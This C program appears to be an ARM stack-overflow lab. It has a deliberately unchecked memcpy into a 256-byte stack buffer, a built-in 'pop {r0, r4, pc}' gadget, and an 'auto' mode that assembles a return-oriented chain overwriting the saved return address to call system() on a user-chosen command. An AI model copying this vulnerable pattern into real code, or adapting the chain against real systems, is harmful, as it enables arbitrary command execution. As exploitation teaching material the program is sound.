// 256-byte stack buffer, saved lr at 260, run with the hex value in argv[1]
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char action_command[64] = "echo PWNED-ARM";

__attribute__((naked, noinline)) void pop_r0_r4_pc(void)
{
	__asm__ volatile("pop {r0, r4, pc}");
}

__attribute__((noinline, noclone)) static void handle_action(const uint8_t *value, size_t len)
{
	char buf[256];

	memcpy(buf, value, len);
	printf("handled %zu bytes\n", len);
	fflush(stdout);
}

int main(int argc, char **argv)
{
	uint8_t data[1024];
	size_t n = 0;
	char *p;

	printf("gadget=%p system=%p command=%p\n",
	       (void *) &pop_r0_r4_pc, (void *) &system, (void *) action_command);

	if (argc > 1 && strcmp(argv[1], "auto") == 0) {
		uint32_t *words;

		memset(data, 'A', 512);
		words = (uint32_t *) (data + 260);
		words[0] = (uint32_t) (uintptr_t) &pop_r0_r4_pc | 1;
		words[1] = (uint32_t) (uintptr_t) action_command;
		words[2] = 0;
		words[3] = (uint32_t) (uintptr_t) &system;
		n = 512;
	} else if (argc > 1) {
		for (p = argv[1]; *p && n < sizeof(data); p += 2) {
			unsigned int value;

			if (sscanf(p, "%2x", &value) != 1)
				break;
			data[n++] = (uint8_t) value;
		}
	}
	if (argc > 2)
		strncpy(action_command, argv[2], sizeof(action_command) - 1);

	handle_action(data, n);
	puts("returned");
	return 0;
}
